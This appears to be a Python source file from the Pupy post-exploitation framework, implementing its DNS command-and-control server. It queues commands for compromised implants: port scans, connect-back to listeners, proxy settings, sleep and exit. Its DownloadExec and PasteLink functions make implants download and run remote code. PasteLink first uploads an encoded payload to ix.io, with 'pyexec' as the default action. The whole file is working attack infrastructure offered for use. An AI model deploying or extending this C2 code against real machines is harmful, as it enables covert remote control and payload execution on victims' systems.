# -*- coding: utf-8 -*-
import logging
from PupyCredentials import Credentials
from network.lib.picocmd.server import DnsCommandServerHandler, DnsCommandServer
from network.lib.picocmd.picocmd import (
    OnlineStatusRequest, CheckConnect, Connect, Disconnect,
    Reexec, Sleep, Exit, SetProxy, DownloadExec, PasteLink
)

from pupylib.PupyConfig import PupyConfig
from pupylib.utils.network import get_listener_ip_with_local, get_listener_port

import requests
import netaddr

from urlparse import urlparse

from os import path

from .PupyTriggers import event
from .PupyTriggers import (
    ON_DNSCNC_SESSION, ON_DNSCNC_SESSION_LOST,
    ON_DNSCNC_EGRESS_PORTS, ON_DNSCNC_HIGH_RESOURCE_USAGE,
    ON_DNSCNC_PSTORE, ON_DNSCNC_USER_ACTIVE,
    ON_DNSCNC_USER_INACTIVE, ON_DNSCNC_USERS_INCREMENT,
    ON_DNSCNC_USERS_DECREMENT, ON_DNSCNC_ONLINE_STATUS,
    CUSTOM
)

class PupyDnsCommandServerHandler(DnsCommandServerHandler):
    def __init__(self, *args, **kwargs):
        if 'config' in kwargs:
            self.config = kwargs.pop('config')
        else:
            self.config = None

        if 'server' in kwargs:
            self.server = kwargs.pop('server')
        else:
            self.server = None

        if 'whitelist' not in kwargs and self.config:
            kwargs['whitelist'] = self._whitelist

        DnsCommandServerHandler.__init__(self, *args, **kwargs)

    def _whitelist(self, nodeid, cid, version):
        if not self.config.getboolean('dnscnc', 'whitelist'):
            return True

        if version == 1 and not self.config.getboolean('dnscnc', 'allow_v1'):
            return False

        if not cid or not nodeid:
            return self.config.getboolean('dnscnc', 'allow_by_default')

        nodeid = '{:012x}'.format(nodeid)
        cid = '{:016x}'.format(cid)

        allowed_nodes = self.config.get('cids', cid)
        if not allowed_nodes:
            if self.config.getboolean('dnscnc', 'allow_by_default'):
                return True
            return False

        return nodeid in set([x.strip().lower() for x in allowed_nodes.split(',')])

    def on_new_session(self, session):
        event(
            ON_DNSCNC_SESSION, session,
            self.server.pupsrv,
            sid=session.spi, node=session.node)

    def on_session_cleaned_up(self, session):
        event(ON_DNSCNC_SESSION_LOST,
              session, self.server.pupsrv,
              sid=session.spi, node=session.node)

    def on_online_status(self, session):
        event(ON_DNSCNC_ONLINE_STATUS, session,
              self.server.pupsrv, sid=session.spi, node=session.node,
              **session.online_status)

    def on_egress_ports(self, session):
        event(ON_DNSCNC_EGRESS_PORTS, session,
              self.server.pupsrv, sid=session.spi, node=session.node,
              ports=session.egress_ports)

    def on_pstore(self, session):
        event(ON_DNSCNC_PSTORE, session,
              self.server.pupsrv, sid=session.spi, node=session.node)

    def on_user_become_active(self, session):
        event(ON_DNSCNC_USER_ACTIVE, session,
              self.server.pupsrv, sid=session.spi, node=session.node)

    def on_user_become_inactive(self, session):
        event(ON_DNSCNC_USER_INACTIVE, session,
              self.server.pupsrv, sid=session.spi, node=session.node)

    def on_users_increment(self, session):
        event(ON_DNSCNC_USERS_INCREMENT, session,
              self.server.pupsrv, sid=session.spi, node=session.node,
              count=session.system_status['users'])

    def on_users_decrement(self, session):
        event(ON_DNSCNC_USERS_DECREMENT, session,
              self.server.pupsrv, sid=session.spi, node=session.node,
              count=session.system_status['users'])

    def on_high_resource_usage(self, session):
        event(ON_DNSCNC_HIGH_RESOURCE_USAGE, session,
              self.server.pupsrv, sid=session.spi, node=session.node,
              mem=session.system_status['mem'],
              cpu=session.system_status['cpu'])

    def on_custom_event(self, eventid, session, node):
        if eventid & CUSTOM != CUSTOM:
            return

        if session:
            event(eventid, session,
                self.server.pupsrv, sid=session.spi, node=session.node)
        elif node:
            event(eventid, None,
                self.server.pupsrv, sid=None, node=node)
        else:
            event(eventid, None,
                self.server.pupsrv, sid=None, node=None)

    def onlinestatus(self, node=None, default=False):
        return self.add_command(
            OnlineStatusRequest(), session=node, default=default)

    def scan(self, host, first, last, node=None, default=False):
        return self.add_command(
            CheckConnect(host, first, last), session=node, default=default)

    def connect(self, hosts, port, transport, node=None, default=False):
        commands = [
            Connect(host, port, transport) for host in hosts
        ]

        applied = 0
        for command in commands:
            applied = self.add_command(command, session=node, default=default)

        return applied

    def disconnect(self, node=None, default=False):
        return self.add_command(Disconnect(), session=node, default=default)

    def reexec(self, node=None, default=False):
        return self.add_command(Reexec(), session=node, default=default)

    def sleep(self, timeout, node=None, default=False):
        return self.add_command(Sleep(timeout), session=node, default=default)

    def exit(self, node=None, default=False):
        return self.add_command(Exit(), session=node, default=default)

    def proxy(self, uri, node=None, default=False):
        if not uri or uri.lower() in ('none', 'off', 'no', 'disable'):
            return self.add_command(
                SetProxy('none', '0.0.0.0', 0),
                session=node, default=default
            )
        elif uri.lower() in ('on', 'enable', 'yes'):
            return self.add_command(
                SetProxy('any', '0.0.0.0', 0),
                session=node, default=default
            )

        if '://' not in uri:
            uri = 'http://' + uri

        parsed = urlparse(uri)
        return self.add_command(
            SetProxy(
                parsed.scheme,
                parsed.hostname,
                parsed.port or 3128,
                user=parsed.username,
                password=parsed.password
            ),
            session=node, default=default
        )

    def dexec(self, url, action, proxy=False, node=None, default=None):
        return self.add_command(
            DownloadExec(url, action=action, proxy=proxy),
            session=node, default=default
        )

    def pastelink(self, url, action, node=None, default=None):
        return self.add_command(
            PasteLink(url, action=action),
            session=node, default=default
        )

    def find_nodes(self, node):
        if not node:
            return list(self.nodes.itervalues())

        results = []

        if type(node) in (str,unicode):
            nodes = []

            for n in node.split(','):
                try:
                    int(n, 16)
                    nodes.append(n)
                except:
                    for tagged in self.config.by_tags(n):
                        nodes.append(tagged)

                    if nodes:
                        results = super(PupyDnsCommandServerHandler, self).find_nodes(
                            ','.join(nodes))

        return results

    def find_sessions(self, spi=None, node=None):
        if spi or node:
            results = []
            if self.config and node:
                if type(node) in (str,unicode):
                    nodes = []
                    for n in node.split(','):
                        try:
                            netaddr.IPAddress(n)
                            nodes.append(n)
                        except:
                            try:
                                int(n, 16)
                                nodes.append(n)
                            except:
                                for tagged in self.config.by_tags(n):
                                    nodes.append(tagged)

                    if nodes:
                        results = super(PupyDnsCommandServerHandler, self).find_sessions(
                            node=','.join(nodes))
                    else:
                        results = []

            if spi:
                if type(spi) in (str,unicode):
                    spis = []
                    for s in spi.split(','):
                        try:
                            int(s, 16)
                            spis.append(s)
                        except:
                            pass

                    if spis:
                        results += super(PupyDnsCommandServerHandler, self).find_sessions(
                            spi=','.join(spis))
        else:
            results = super(PupyDnsCommandServerHandler, self).find_sessions()

        return results


class PupyDnsCnc(object):
    def __init__(
            self, igd=None,
            recursor=None,
            config=None,
            credentials=None,
            listeners=None,
            cmdhandler=None,
            server=None,
            pproxy=None
        ):

        credentials = credentials or Credentials()
        config = config or PupyConfig()

        self.config = config
        self.credentials = credentials
        self.igd = igd
        self.listeners = listeners
        self.handler = cmdhandler
        self.pproxy = pproxy
        self.pupsrv = server

        fdqn = self.config.get('pupyd', 'dnscnc').split(':')
        domain = fdqn[0]
        if len(fdqn) > 1:
            port = int(fdqn[1])
        else:
            port = 53

        listen = str(config.get('pupyd', 'address') or '0.0.0.0')

        recursor = config.get('pupyd', 'recursor')
        if recursor and recursor.lower() in ('no', 'false', 'stop', 'n', 'disable'):
            recursor = None

        self.dns_domain = domain
        self.dns_port = port
        self.dns_listen = listen
        self.dns_recursor = recursor
        self.dns_handler = PupyDnsCommandServerHandler(
            domain, (
                credentials['DNSCNC_PRIV_KEY'],
                credentials['DNSCNC_PRIV_KEY_V2']
            ),
            recursor=recursor,
            config=self.config,
            server=self
        )

        if self.pproxy:
            try:
                self.server = self.pproxy.dns(self.dns_handler, domain)
            except Exception, e:
                logging.exception(e)
        else:
            self.server = DnsCommandServer(
                self.dns_handler,
                address=listen,
                port=int(port)
            )

            if self.igd and self.igd.available:
                self.igd.AddPortMapping(53, 'UDP', int(port))
                self.igd.AddPortMapping(53, 'TCP', int(port))

        self.server.start()

    def stop(self):
        self.server.stop()

    def list(self, node=None):
        return self.dns_handler.find_sessions(node=node) \
          or self.dns_handler.find_sessions(spi=node)

    def nodes(self, node):
        return self.dns_handler.find_nodes(node)

    def connect(self, host=None, port=None, transport=None, node=None, default=False):
        if port:
            port = int(port)

        if not all([host, port, transport]):
            listeners = self.listeners()
            if not listeners:
                raise ValueError(
                    'No active listeners. Host, port and transport shoul be explicitly specified')

            listener = None
            local = False

            if transport:
                listener = listeners.get(transport)
                if not listener:
                    raise ValueError('Listener for transport {} not found'.format(transport))

            else:
                for l in listeners.itervalues():
                    if not l.local or (port and (l.port == port or l.external_port == port)):
                        listener = l
                        break

                if not listener:
                    listener = next(listeners.itervalues())
                    if listener.port == 0:
                        local = False
                    else:
                        local = True

            if not listener:
                raise ValueError('No listeners found')

            if local:
                _port = get_listener_port(self.config, external=True)
                _host, local = get_listener_ip_with_local(
                    config=self.config, external=True, igd=self.igd)

                if local:
                    raise ValueError(
                        'External host:port not found. '
                        'Please explicitly specify either port or host, port and transport.')

                host = host or _host
                port = port or _port
                transport = listener.name
            else:
                host = host or listener.external
                port = port or listener.external_port
                transport = listener.name

            if self.cmdhandler:
                self.cmdhandler.display_success('Connect: Transport: {} Host: {} Port: {}'.format(
                    transport, host, port))

        return self.dns_handler.connect(
            [host], port, transport,
            node=node,
            default=default
        )

    def scan(self, *args, **kwargs):
        return self.dns_handler.scan(*args, **kwargs)

    def onlinestatus(self, **kwargs):
        return self.dns_handler.onlinestatus(**kwargs)

    def disconnect(self, **kwargs):
        return self.dns_handler.disconnect(**kwargs)

    def exit(self, **kwargs):
        return self.dns_handler.exit(**kwargs)

    def sleep(self, *args, **kwargs):
        return self.dns_handler.sleep(*args, **kwargs)

    def reexec(self, **kwargs):
        return self.dns_handler.reexec(**kwargs)

    def reset(self, **kwargs):
        return self.dns_handler.reset_commands(**kwargs)

    def dexec(self, *args, **kwargs):
        return self.dns_handler.dexec(*args, **kwargs)

    def proxy(self, *args, **kwargs):
        return self.dns_handler.proxy(*args, **kwargs)

    def pastelink(self, content=None, output=None, url=None,
                  action='pyexec', node=None, default=False, legacy=False):

        if not (content or url):
            raise ValueError('content and url and output args are empty')

        if content and url:
            raise ValueError('both content and url are selected')

        if content:
            content_path = path.expanduser(path.expandvars(content))
            if not path.exists(content_path):
                raise ValueError('no such file: {}'.format(content_path))

            payload = b''
            # TODO: add more providers
            with open(content_path) as content:
                payload = self.dns_handler.encode_pastelink_content(
                    content.read(), self.dns_handler.ENCODER_V1 \
                    if legacy else self.dns_handler.ENCODER_V2)

            if not output:
                response = requests.post('http://ix.io', data={'f:1':payload})
                if response.ok:
                    url = response.content.strip()

                    if not url:
                        raise ValueError('couldn\'t create pastelink url')
            else:
                with open(output, 'wb') as output_file:
                    output_file.write(payload)


        if self.cmdhandler:
            self.cmdhandler.display_success('Pastelink: {} Action: {} Legacy: {}'.format(
                'file: {}'.format(output) if output else 'url: {}'.format(url),
                action, legacy))

        count = 0
        if not output:
            count = self.dns_handler.pastelink(url, action, node=node, default=default)

        return count, url

    @property
    def policy(self):
        return {
            'interval': self.dns_handler.interval,
            'timeout': self.dns_handler.timeout,
            'kex': self.dns_handler.kex,
        }

    def set_policy(self, *args, **kwargs):
        return self.dns_handler.set_policy(*args, **kwargs)

    @property
    def dirty(self):
        count = 0
        for session in self.dns_handler.find_sessions():
            if session.commands:
                count += 1
        return count

    @property
    def count(self):
        return len(self.dns_handler.sessions)

    @property
    def commands(self):
        return self.dns_handler.commands

    @property
    def node_commands(self):
        return self.dns_handler.node_commands
